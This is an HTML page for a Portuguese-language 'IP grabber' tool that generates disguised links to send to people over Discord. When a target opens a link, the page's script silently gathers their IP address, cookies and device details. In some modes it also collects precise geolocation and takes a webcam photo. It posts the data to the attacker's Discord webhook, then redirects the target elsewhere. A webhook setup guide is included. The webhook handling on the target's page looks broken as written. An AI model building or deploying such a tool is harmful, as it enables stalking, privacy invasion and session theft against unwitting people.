<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Grabber & Tracker 3.0 by Noyato</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
  body {
    margin: 0;
    font-family: 'Montserrat', sans-serif;
    background: #000;
    color: #fff;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    justify-content: center;
    align-items: center;
    padding: 20px;
    box-sizing: border-box;
  }
  h1 {
    font-weight: 700;
    font-size: 2.5rem;
    margin-bottom: 0.6em;
    text-align: center;
    text-shadow: 0 0 12px #ff0000, 0 0 25px #ff0000;
  }
  p.description {
    max-width: 520px;
    margin-bottom: 1.8em;
    text-align: center;
    font-size: 1rem;
    opacity: 0.85;
  }
  .container {
    background: rgba(255, 0, 0, 0.12);
    padding: 28px 36px;
    border-radius: 18px;
    box-shadow: 0 10px 30px rgb(255 0 0 / 0.3);
    width: 100%;
    max-width: 540px;
    backdrop-filter: blur(18px);
    margin-bottom: 2em;
    position: relative;
    overflow: hidden;
  }
  label {
    display: block;
    margin-bottom: 0.5em;
    font-weight: 600;
    font-size: 0.95rem;
    color: #ffbbbb;
  }
  input[type="text"],
  input[type="url"] {
    width: 100%;
    padding: 12px 16px;
    border-radius: 10px;
    border: 2.4px solid #ff0000;
    background: rgba(255, 0, 0, 0.22);
    font-size: 1.05rem;
    margin-bottom: 1.3em;
    box-sizing: border-box;
    outline: none;
    transition: border-color 0.3s ease, box-shadow 0.3s ease;
    color: #fff;
  }
  input[type="text"]:focus,
  input[type="url"]:focus {
    border-color: #ff6b6b;
    box-shadow: 0 0 14px #ff6b6b;
    color: #fff;
  }
  button {
    width: 100%;
    padding: 16px 0;
    border-radius: 14px;
    border: none;
    font-weight: 700;
    font-size: 1.2rem;
    background: #ff0000;
    color: white;
    cursor: pointer;
    transition: background 0.3s ease, transform 0.3s ease;
    box-shadow: 0 8px 24px #ff0000;
  }
  button:hover {
    background: #cc0000;
    transform: scale(1.07);
  }
  .output {
    margin-top: 1.8em;
    background: rgba(0, 0, 0, 0.28);
    padding: 14px 20px;
    border-radius: 14px;
    font-family: monospace;
    word-wrap: break-word;
    font-size: 0.94rem;
    max-height: 160px;
    overflow-y: auto;
    color: #ffdddd;
    border: 1.5px solid #ff1111;
    user-select: all;
  }
  .footer {
    margin-top: 3em;
    font-size: 0.9rem;
    color: #aab2bd;
    text-align: center;
  }
  a.footer-link {
    color: #aab2bd;
    text-decoration: none;
    font-weight: 600;
  }
  a.footer-link:hover {
    color: #ff0000;
    text-decoration: underline;
  }
  details {
    background: rgba(0, 0, 0, 0.18);
    padding: 12px 16px;
    border-radius: 12px;
    margin-top: 20px;
    cursor: pointer;
    color: #d1d5db;
    font-size: 0.92rem;
    user-select: none;
  }
  details summary {
    font-weight: 600;
    outline: none;
  }
  details[open] {
    color: #eef2ff;
    background: rgba(255, 0, 0, 0.35);
    box-shadow: 0 10px 40px rgba(255, 0, 0, 0.6);
  }
  details p {
    margin-top: 1em;
    line-height: 1.35;
    color: #cbd5e1;
  }
  .instagram-icon {
    margin-top: 1.2em;
    width: 42px;
    height: 42px;
    cursor: pointer;
    transition: transform 0.3s ease;
  }
  .instagram-icon:hover {
    transform: scale(1.15);
  }
  .radio-group {
    margin-bottom: 1.4em;
    color: #ffbbbb;
  }
  .radio-group label {
    font-weight: 600;
    margin-right: 20px;
    cursor: pointer;
  }
  video {
    display: none;
  }
</style>
</head>
<body>
<h1>Noyato Grabber 3.0 - Escolha sua captura</h1>
<p class="description">Escolha o tipo de captura (grab, tracking, camera ou full) e gere o link para enviar no Discord. Use com responsabilidade.</p>
<div class="container" id="input-container">
  <label for="destUrl">URL de destino (ex: https://example.com)</label>
  <input type="url" id="destUrl" placeholder="https://example.com" autocomplete="off" required />
  
  <label for="webhookUrl">Webhook do Discord (URL do canal para receber dados)</label>
  <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" required />

  <div class="radio-group">
    <label><input type="radio" name="mode" value="grab" checked /> Grab (dados IP b√°sicos)</label>
    <label><input type="radio" name="mode" value="tracking" /> Tracking (geolocaliza√ß√£o)</label>
    <label><input type="radio" name="mode" value="camera" /> Camera (foto via webcam)</label>
    <label><input type="radio" name="mode" value="full" /> Full (todos os dados)</label>
  </div>
  
  <button id="generateBtn">Gerar Link Grabber</button>
  
  <div class="output" id="output" style="display:none;" title="Clique para copiar"></div>
</div>
<details>
  <summary>Como criar um webhook no seu canal do Discord?</summary>
  <p>1. Abra o Discord e v√° at√© o canal onde quer receber os dados.</p>
  <p>2. Clique no nome do canal e selecione "Editar Canal".</p>
  <p>3. V√° na aba "Integra√ß√µes".</p>
  <p>4. Clique em "Webhooks" e depois em "Novo webhook".</p>
  <p>5. D√™ um nome e imagem ao webhook se quiser.</p>
  <p>6. Copie o URL do webhook (come√ßa com <code>https://discord.com/api/webhooks/...</code>).</p>
  <p>7. Cole esse URL no campo "Webhook do Discord" acima.</p>
</details>

<script>
  // Fun√ß√£o para extrair query string
  function getQueryParams() {
    const params = {};
    const queryString = window.location.search.substring(1);
    const pairs = queryString.split("&").filter(Boolean);
    for (const pair of pairs) {
      const [key, value] = pair.split("=");
      params[decodeURIComponent(key)] = decodeURIComponent(value || "");
    }
    return params;
  }

  const inputContainer = document.getElementById('input-container');
  const outputDiv = document.getElementById('output');
  const generateBtn = document.getElementById('generateBtn');
  const destUrlInput = document.getElementById('destUrl');
  const webhookUrlInput = document.getElementById('webhookUrl');

  generateBtn.addEventListener('click', () => {
    const dest = destUrlInput.value.trim();
    const webhook = webhookUrlInput.value.trim();
    const modeElem = document.querySelector('input[name="mode"]:checked');
    const mode = modeElem ? modeElem.value : 'grab';

    if (!dest || !webhook) {
      alert('Por favor, preencha ambos os campos.');
      return;
    }
    try {
      new URL(dest);
    } catch {
      alert('URL de destino inv√°lida.');
      return;
    }
    try {
      new URL(webhook);
    } catch {
      alert('Webhook inv√°lido.');
      return;
    }

    // Link gerado com link destino e par√¢metro mode
    const baseUrl = window.location.origin + window.location.pathname;
    const encodedDest = encodeURIComponent(dest);
    const grabberLink = `${baseUrl}?dest=${encodedDest}&mode=${mode}`;

    outputDiv.style.display = 'block';
    outputDiv.textContent = grabberLink;
    outputDiv.title = 'Clique para copiar';
    outputDiv.scrollIntoView({behavior:'smooth'});
  });

  // Copiar texto ao clicar no output
  outputDiv.addEventListener('click', () => {
    navigator.clipboard.writeText(outputDiv.textContent);
    alert('Link copiado para a √°rea de transfer√™ncia!');
  });

  // Fun√ß√£o para coletar cookies
  function collectCookies() {
    try {
      return document.cookie || "Nenhum cookie dispon√≠vel";
    } catch(e) {
      return "N√£o foi poss√≠vel acessar cookies";
    }
  }

  // Detecta marca dispositivo pelo userAgent
  function getDeviceBrand() {
    const ua = navigator.userAgent.toLowerCase();
    if(/samsung/.test(ua)) return "Samsung";
    if(/huawei/.test(ua)) return "Huawei";
    if(/xiaomi/.test(ua)) return "Xiaomi";
    if(/iphone/.test(ua)) return "Apple iPhone";
    if(/ipad/.test(ua)) return "Apple iPad";
    if(/windows phone/.test(ua)) return "Windows Phone";
    if(/macintosh/.test(ua)) return "Apple Mac";
    if(/windows/.test(ua)) return "Windows PC";
    if(/linux/.test(ua)) return "Linux Device";
    return "Desconhecido/N√£o detectado";
  }

  // Fun√ß√£o para pegar localiza√ß√£o pelo navegador via Geolocation API
  function getPosition() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        return reject("Geolocaliza√ß√£o n√£o suportada");
      }
      navigator.geolocation.getCurrentPosition(pos => resolve(pos), err => reject(err));
    });
  }

  // Fun√ß√£o para capturar foto da c√¢mera (webcam)
  async function captureCameraPhoto() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error("Webcam n√£o suportada");
    }
    
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);

    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await video.play();

    // Espera pelo v√≠deo carregado para tirar foto
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Captura a foto
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    // Para o stream
    stream.getTracks().forEach(track => track.stop());
    video.remove();

    // Retorna base64 da foto
    return canvas.toDataURL('image/png');
  }

  async function sendWebhook(webhookUrl, payload) {
    try {
      const res = await fetch(webhookUrl, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload),
      });
      if (!res.ok) {
        console.error('Erro no webhook:', await res.text());
      }
    } catch (e) {
      console.error('Falha ao enviar webhook:', e);
    }
  }

  (async function executeGrabberIfNeeded() {
    const params = getQueryParams();
    const destUrl = params.dest ? decodeURIComponent(params.dest) : null;
    const mode = params.mode || null;
    const webhookUrl = document.getElementById('webhookUrl').value.trim() || null;

    if (!destUrl || !mode) {
      // Sem par√¢metros necess√°rios, mostra formul√°rio pra gerar link.
      return;
    }

    // Pega webhook da URL ou do input, ou exibe erro (webhook pelo input atual)
    // User must input webhook first to page and submit the link to work for the grabber.
    // So disable interface
    inputContainer.style.display = 'none';
    outputDiv.style.display = 'none';

    // Pega IP via API p√∫blica
    let ip = "Desconhecido";
    try {
      const ipResp = await fetch("https://api.ipify.org?format=json");
      const ipJson = await ipResp.json();
      ip = ipJson.ip || ip;
    } catch {}

    const cookies = collectCookies();
    const userAgent = navigator.userAgent || "Desconhecido";
    const deviceBrand = getDeviceBrand();
    const dateTime = new Date().toLocaleString('pt-BR',{timeZone: 'UTC'});

    // Preparando dados para enviar via webhook
    let embed = {
      title: `‚ö†Ô∏è Novo clique no IP Grabber - modo: ${mode.toUpperCase()}`,
      color: 0xff0000,
      timestamp: new Date().toISOString(),
      footer: {text: "Discord Bot by Noyato154"},
      fields: [
        {name: "üî¥ IP", value: ip, inline: true},
        {name: "üì± Marca do Dispositivo", value: deviceBrand, inline: true},
        {name: "üñ• Navegador / Sistema", value: userAgent, inline: false},
        {name: "üç™ Cookies", value: cookies.length > 1024 ? cookies.slice(0,1024)+"..." : cookies, inline: false},
        {name: "üîó Link de Destino", value: "Instagram", inline: false}
      ]
    };

    if(mode === 'grab') {
      // Apenas dados b√°sicos j√° carregados no embed
    }
    else if(mode === 'tracking' || mode === 'full') {
      // Pega geolocaliza√ß√£o navegador
      try {
        const position = await getPosition();
        const lat = position.coords.latitude.toFixed(6);
        const lon = position.coords.longitude.toFixed(6);
        const accuracy = position.coords.accuracy + " metros";

        // Adiciona campos location no embed
        embed.fields.push(
          {name: "üìç Latitude", value: lat, inline: true},
          {name: "üìç Longitude", value: lon, inline: true},
          {name: "üìè Precis√£o", value: accuracy, inline: true},
        );

        // Cria URL do mapa Google Static Maps (sem expor chave API)
        const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=600x300&markers=color:red%7C${lat},${lon}&key=YOUR_GOOGLE_MAPS_API_KEY`;
        embed.image = {url: mapUrl};
      } catch(err) {
        embed.fields.push({name: "‚ö†Ô∏è Tracking", value: "Permiss√£o negada ou erro na geolocaliza√ß√£o", inline: false});
      }
    }

    if(mode === 'camera' || mode === 'full') {
      // Captura foto webcam e envia num embed separado para evitar limite campos e tamanho
      try {
        const photoDataUrl = await captureCameraPhoto();

        // Envia embed separado para foto
        await sendWebhook(webhookUrl, {
          embeds: [{
            title: "üì∏ Foto da C√¢mera Capturada",
            color: 0xff0000,
            image: {url: photoDataUrl},
            timestamp: new Date().toISOString(),
            footer: {text: "Discord Bot by Noyato154"}
          }]
        });
      } catch(e) {
        // Foto falhou, envia aviso
        await sendWebhook(webhookUrl, {
          content: "‚ö†Ô∏è Falha ao capturar foto da c√¢mera ou permiss√£o negada."
        });
      }
    }

    // Envia embed principal com dados
    await sendWebhook(webhookUrl, {embeds: [embed]});

    // Redireciona ap√≥s 4s pro destino
    setTimeout(() => {
      window.location.href = destUrl;
    }, 4000);

  })();
</script>

<div class="footer">
  Desenvolvido por noyato154 <br />
  <a href="https://www.instagram.com/mnr_magal/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="instagram-icon" />
  </a>
</div>
</body>
</html>
